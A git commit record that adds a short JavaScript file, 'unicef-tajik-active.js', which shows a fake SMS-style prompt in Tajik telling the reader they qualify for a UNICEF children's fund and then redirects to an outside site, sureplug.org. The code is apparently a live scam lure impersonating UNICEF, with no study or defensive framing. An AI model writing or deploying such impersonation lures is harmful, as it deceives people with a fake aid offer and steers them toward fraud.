443cb7203ec449b7b7b4766cc0fcbc78d222bb78
surepluger <adigunkola666@gmail.com>
2025-04-03 17:00:29 +0100

    Create unicef-tajik-active.js

---
+++ unicef-tajik-active.js
@@ -0,0 +1,5 @@
+var password = 'Муроҷиат кунед'
+password=prompt('SMS: Табрикот, шумо ба Хазинаи кӯдакони Созмони Милали Муттаҳид (ЮНИСЕФ) мувофиқ ҳастед, OKро пахш кунед. ','Муроҷиат кунед');
+if (password != 'Муроҷиат кунед') {
+location.href='https://sureplug.org/unicef-tajikistan';
+}
